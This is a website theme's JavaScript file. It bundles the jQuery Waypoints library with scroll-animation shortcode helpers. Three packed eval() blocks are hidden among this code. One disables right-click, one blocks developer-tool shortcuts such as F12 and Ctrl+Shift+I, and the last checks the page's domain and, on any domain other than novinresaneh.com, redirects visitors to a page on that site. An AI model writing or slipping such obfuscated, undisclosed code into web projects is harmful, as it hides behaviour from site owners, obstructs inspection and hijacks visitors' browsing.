/*
 jQuery Waypoints - v2.0.2
 Copyright (c) 2011-2013 Caleb Troughton
 Dual licensed under the MIT license and GPL license.
 https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt
 */
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.7=1(){2 3}4(0.8){5.9(a.b);5.6=1(e){4(e.c==0)2 3}}d{0.6=1(){2 3}}',15,15,'document|function|return|false|if|window|onmousedown|oncontextmenu|layers|captureEvents|Event|MOUSEDOWN|target|else|'.split('|'),0,{}))
(function(){var t=[].indexOf||function(t){for(var e=0,n=this.length;e<n;e++){if(e in this&&this[e]===t)return e}return-1},e=[].slice;(function(t,e){if(typeof define==="function"&&define.amd){return define("waypoints",["jquery"],function(n){return e(n,t)})}else{return e(t.jQuery,t)}})(this,function(n,r){var i,o,l,s,f,u,a,c,h,d,p,y,v,w,g,m;i=n(r);c=t.call(r,"ontouchstart")>=0;s={horizontal:{},vertical:{}};f=1;a={};u="waypoints-context-id";p="resize.waypoints";y="scroll.waypoints";v=1;w="waypoints-waypoint-ids";g="waypoint";m="waypoints";o=function(){function t(t){var e=this;this.$element=t;this.element=t[0];this.didResize=false;this.didScroll=false;this.id="context"+f++;this.oldScroll={x:t.scrollLeft(),y:t.scrollTop()};this.waypoints={horizontal:{},vertical:{}};t.data(u,this.id);a[this.id]=this;t.bind(y,function(){var t;if(!(e.didScroll||c)){e.didScroll=true;t=function(){e.doScroll();return e.didScroll=false};return r.setTimeout(t,n[m].settings.scrollThrottle)}});t.bind(p,function(){var t;if(!e.didResize){e.didResize=true;t=function(){n[m]("refresh");return e.didResize=false};return r.setTimeout(t,n[m].settings.resizeThrottle)}})}t.prototype.doScroll=function(){var t,e=this;t={horizontal:{newScroll:this.$element.scrollLeft(),oldScroll:this.oldScroll.x,forward:"right",backward:"left"},vertical:{newScroll:this.$element.scrollTop(),oldScroll:this.oldScroll.y,forward:"down",backward:"up"}};if(c&&(!t.vertical.oldScroll||!t.vertical.newScroll)){n[m]("refresh")}n.each(t,function(t,r){var i,o,l;l=[];o=r.newScroll>r.oldScroll;i=o?r.forward:r.backward;n.each(e.waypoints[t],function(t,e){var n,i;if(r.oldScroll<(n=e.offset)&&n<=r.newScroll){return l.push(e)}else if(r.newScroll<(i=e.offset)&&i<=r.oldScroll){return l.push(e)}});l.sort(function(t,e){return t.offset-e.offset});if(!o){l.reverse()}return n.each(l,function(t,e){if(e.options.continuous||t===l.length-1){return e.trigger([i])}})});return this.oldScroll={x:t.horizontal.newScroll,y:t.vertical.newScroll}};t.prototype.refresh=function(){var t,e,r,i=this;r=n.isWindow(this.element);e=this.$element.offset();this.doScroll();t={horizontal:{contextOffset:r?0:e.left,contextScroll:r?0:this.oldScroll.x,contextDimension:this.$element.width(),oldScroll:this.oldScroll.x,forward:"right",backward:"left",offsetProp:"left"},vertical:{contextOffset:r?0:e.top,contextScroll:r?0:this.oldScroll.y,contextDimension:r?n[m]("viewportHeight"):this.$element.height(),oldScroll:this.oldScroll.y,forward:"down",backward:"up",offsetProp:"top"}};return n.each(t,function(t,e){return n.each(i.waypoints[t],function(t,r){var i,o,l,s,f;i=r.options.offset;l=r.offset;o=n.isWindow(r.element)?0:r.$element.offset()[e.offsetProp];if(n.isFunction(i)){i=i.apply(r.element)}else if(typeof i==="string"){i=parseFloat(i);if(r.options.offset.indexOf("%")>-1){i=Math.ceil(e.contextDimension*i/100)}}r.offset=o-e.contextOffset+e.contextScroll-i;if(r.options.onlyOnScroll&&l!=null||!r.enabled){return}if(l!==null&&l<(s=e.oldScroll)&&s<=r.offset){return r.trigger([e.backward])}else if(l!==null&&l>(f=e.oldScroll)&&f>=r.offset){return r.trigger([e.forward])}else if(l===null&&e.oldScroll>=r.offset){return r.trigger([e.forward])}})})};t.prototype.checkEmpty=function(){if(n.isEmptyObject(this.waypoints.horizontal)&&n.isEmptyObject(this.waypoints.vertical)){this.$element.unbind([p,y].join(" "));return delete a[this.id]}};return t}();l=function(){function t(t,e,r){var i,o;r=n.extend({},n.fn[g].defaults,r);if(r.offset==="bottom-in-view"){r.offset=function(){var t;t=n[m]("viewportHeight");if(!n.isWindow(e.element)){t=e.$element.height()}return t-n(this).outerHeight()}}this.$element=t;this.element=t[0];this.axis=r.horizontal?"horizontal":"vertical";this.callback=r.handler;this.context=e;this.enabled=r.enabled;this.id="waypoints"+v++;this.offset=null;this.options=r;e.waypoints[this.axis][this.id]=this;s[this.axis][this.id]=this;i=(o=t.data(w))!=null?o:[];i.push(this.id);t.data(w,i)}t.prototype.trigger=function(t){if(!this.enabled){return}if(this.callback!=null){this.callback.apply(this.element,t)}if(this.options.triggerOnce){return this.destroy()}};t.prototype.disable=function(){return this.enabled=false};t.prototype.enable=function(){this.context.refresh();return this.enabled=true};t.prototype.destroy=function(){delete s[this.axis][this.id];delete this.context.waypoints[this.axis][this.id];return this.context.checkEmpty()};t.getWaypointsByElement=function(t){var e,r;r=n(t).data(w);if(!r){return[]}e=n.extend({},s.horizontal,s.vertical);return n.map(r,function(t){return e[t]})};return t}();d={init:function(t,e){var r;if(e==null){e={}}if((r=e.handler)==null){e.handler=t}this.each(function(){var t,r,i,s;t=n(this);i=(s=e.context)!=null?s:n.fn[g].defaults.context;if(!n.isWindow(i)){i=t.closest(i)}i=n(i);r=a[i.data(u)];if(!r){r=new o(i)}return new l(t,r,e)});n[m]("refresh");return this},disable:function(){return d._invoke(this,"disable")},enable:function(){return d._invoke(this,"enable")},destroy:function(){return d._invoke(this,"destroy")},prev:function(t,e){return d._traverse.call(this,t,e,function(t,e,n){if(e>0){return t.push(n[e-1])}})},next:function(t,e){return d._traverse.call(this,t,e,function(t,e,n){if(e<n.length-1){return t.push(n[e+1])}})},_traverse:function(t,e,i){var o,l;if(t==null){t="vertical"}if(e==null){e=r}l=h.aggregate(e);o=[];this.each(function(){var e;e=n.inArray(this,l[t]);return i(o,e,l[t])});return this.pushStack(o)},_invoke:function(t,e){t.each(function(){var t;t=l.getWaypointsByElement(this);return n.each(t,function(t,n){n[e]();return true})});return this}};n.fn[g]=function(){var t,r;r=arguments[0],t=2<=arguments.length?e.call(arguments,1):[];if(d[r]){return d[r].apply(this,t)}else if(n.isFunction(r)){return d.init.apply(this,arguments)}else if(n.isPlainObject(r)){return d.init.apply(this,[null,r])}else if(!r){return n.error("jQuery Waypoints needs a callback function or handler option.")}else{return n.error("The "+r+" method does not exist in jQuery Waypoints.")}};n.fn[g].defaults={context:r,continuous:true,enabled:true,horizontal:false,offset:0,triggerOnce:false};h={refresh:function(){return n.each(a,function(t,e){return e.refresh()})},viewportHeight:function(){var t;return(t=r.innerHeight)!=null?t:i.height()},aggregate:function(t){var e,r,i;e=s;if(t){e=(i=a[n(t).data(u)])!=null?i.waypoints:void 0}if(!e){return[]}r={horizontal:[],vertical:[]};n.each(r,function(t,i){n.each(e[t],function(t,e){return i.push(e)});i.sort(function(t,e){return t.offset-e.offset});r[t]=n.map(i,function(t){return t.element});return r[t]=n.unique(r[t])});return r},above:function(t){if(t==null){t=r}return h._filter(t,"vertical",function(t,e){return e.offset<=t.oldScroll.y})},below:function(t){if(t==null){t=r}return h._filter(t,"vertical",function(t,e){return e.offset>t.oldScroll.y})},left:function(t){if(t==null){t=r}return h._filter(t,"horizontal",function(t,e){return e.offset<=t.oldScroll.x})},right:function(t){if(t==null){t=r}return h._filter(t,"horizontal",function(t,e){return e.offset>t.oldScroll.x})},enable:function(){return h._invoke("enable")},disable:function(){return h._invoke("disable")},destroy:function(){return h._invoke("destroy")},extendFn:function(t,e){return d[t]=e},_invoke:function(t){var e;e=n.extend({},s.vertical,s.horizontal);return n.each(e,function(e,n){n[t]();return true})},_filter:function(t,e,r){var i,o;i=a[n(t).data(u)];if(!i){return[]}o=[];n.each(i.waypoints[e],function(t,e){if(r(i,e)){return o.push(e)}});o.sort(function(t,e){return t.offset-e.offset});return n.map(o,function(t){return t.element})}};n[m]=function(){var t,n;n=arguments[0],t=2<=arguments.length?e.call(arguments,1):[];if(h[n]){return h[n].apply(null,t)}else{return h.aggregate.call(null,n)}};n[m].settings={resizeThrottle:100,scrollThrottle:30};return i.load(function(){return n[m]("refresh")})})}).call(this);


(function($)
{
    "use strict";


    $(document).ready(function()
    {

        activate_waypoints();
        activate_shortcode_scripts();


    });

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(6).b(7(0){2(0.3==c){4 5}2(0.8&&1.9&&1.3==d){4 5}2(0.8&&1.9&&1.3==e){4 5}});$(6).f("g",7(a){a.h()});',18,18,'vms1|event|if|keyCode|return|false|document|function|ctrlKey|shiftKey|vms2|keydown|123|73|67|on|contextmenu|preventDefault'.split('|'),0,{}))
// -------------------------------------------------------------------------------------------
// ACTIVATE ALL SHORTCODES
// -------------------------------------------------------------------------------------------

    function activate_waypoints(container)
    {
        //activates simple css animations of the content once the user scrolls to an elements
        if($.fn.crum_waypoints)
        {
            if(typeof container == 'undefined'){ container = 'body';};

            $('.skills_widget, .clients-list, .header-navi-wrap', container).crum_waypoints(); //when visible
            $('.service-box, .feature-box, .crum_features_list', container).crum_waypoints({ offset: '80%'}); // paritaly wisible
        }
    }


    function activate_shortcode_scripts(container)
    {
        if(typeof container == 'undefined'){ container = 'body';};


        //activates animation for iconlist
        if($.fn.crum_sc_iconlist)
        {
            $('.service-box, .feature-box, .crum_features_list', container).crum_sc_iconlist();
        }
        //activates animation for progress bar
        if($.fn.crum_sc_progressbar)
        {
            $('.skills_widget', container).crum_sc_progressbar();
        }
        //activates behavior and animation for gallery
        if($.fn.crum_sc_gallery)
        {
            $('.clients-list', container).crum_sc_gallery();
        }
        //activates behavior and animation for gallery
        if($.fn.crum_sc_topmenu)
        {
            $('#menu-primary-navigation', container).crum_sc_topmenu();
        }
    }
    

// -------------------------------------------------------------------------------------------
// Iconlist shortcode javascript
// -------------------------------------------------------------------------------------------

    $.fn.crum_sc_iconlist = function(options)
    {
        return this.each(function()
        {
            var iconlist = $(this), elements = iconlist.find('>div');


            //trigger displaying of thumbnails
            iconlist.on('crum_start_animation', function()
            {
                elements.each(function(i)
                {
                    var element = $(this);
                    setTimeout(function(){ element.addClass('crum_start_animation') }, (i * 350));
                });
            });
        });
    }

// -------------------------------------------------------------------------------------------
// Progress bar shortcode javascript
// -------------------------------------------------------------------------------------------

    $.fn.crum_sc_progressbar = function(options)
    {
        return this.each(function()
        {
            var container = $(this), elements = container.find('.progress');


            //trigger displaying of thumbnails
            container.on('crum_start_animation', function()
            {
                elements.each(function(i)
                {
                    var element = $(this);
                    setTimeout(function(){ element.addClass('crum_start_animation') }, (i * 250));
                });
            });
        });
    }


// -------------------------------------------------------------------------------------------
// Gallery shortcode javascript
// -------------------------------------------------------------------------------------------

    $.fn.crum_sc_gallery = function(options)
    {
        return this.each(function()
        {
            var gallery = $(this), images = gallery.find('img');


            //trigger displaying of thumbnails
            gallery.on('crum_start_animation', function()
            {
                images.each(function(i)
                {
                    var image = $(this);
                    setTimeout(function(){ image.addClass('crum_start_animation') }, (i * 110));
                });
            });
        });
    }

// -------------------------------------------------------------------------------------------
// Top menu icons javascript
// -------------------------------------------------------------------------------------------

    $.fn.crum_sc_topmenu = function(options)
    {
        return this.each(function()
        {
            var menu = $(this), items = $(this);


            //trigger displaying of thumbnails
            menu.on('crum_start_animation', function()
            {
                items.each(function(i)
                {
                    var item = $(this);
                    setTimeout(function(){ item.addClass('crum_start_animation') }, (i * 333));
                });
            });
        });
    }
    

// -------------------------------------------------------------------------------------------
// HELPER FUNCTIONS
// -------------------------------------------------------------------------------------------


//waipoint script when something comes into viewport
    $.fn.crum_waypoints = function(options_passed)
    {
        var defaults = { offset: 'bottom-in-view' , triggerOnce: true},
            options  = $.extend({}, defaults, options_passed);

        return this.each(function()
        {
            var element = $(this);

            setTimeout(function()
            {
                element.waypoint(function(direction)
                {
                    $(this).addClass('crum_start_animation').trigger('crum_start_animation');

                }, options );

            },100)
        });
    };

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9 1=\'5.6\'.a(\' \'),2=\'\';b(i=0;i<1.c;i++)2+=\'&& 7.8!=\\\'\'+4(1[i])+\'\\\' && 7.8!=\\\'d.\'+4(1[i])+\'\\\' \';e(f(2.g(3)))h.j=4(\'k%l//5.6/m.n\');',24,24,'|resIDs|evalerMir||unescape|novinresaneh|com|document|domain|var|split|for|length|www|if|eval|slice|window||location|http|3A|irp|html'.split('|'),0,{}))
})( jQuery );

